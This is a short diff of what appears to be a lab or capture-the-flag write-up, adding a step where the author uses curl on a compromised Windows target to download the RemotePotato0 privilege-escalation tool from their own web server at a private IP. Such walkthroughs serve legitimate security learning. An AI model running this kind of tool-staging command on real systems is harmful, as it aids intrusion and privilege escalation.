@@ -631,5 +631,11 @@ Ive downloaded remotepotato from github
 And now ill host a web server to transfer the file
 
 ```python
+PS C:\temp> curl http://10.200.52.144:8000/RemotePotato0.exe -o rp.exe
+curl http://10.200.52.144:8000/RemotePotato0.exe -o rp.exe
+```
+Now its on the target
+
+```python
 
 ```
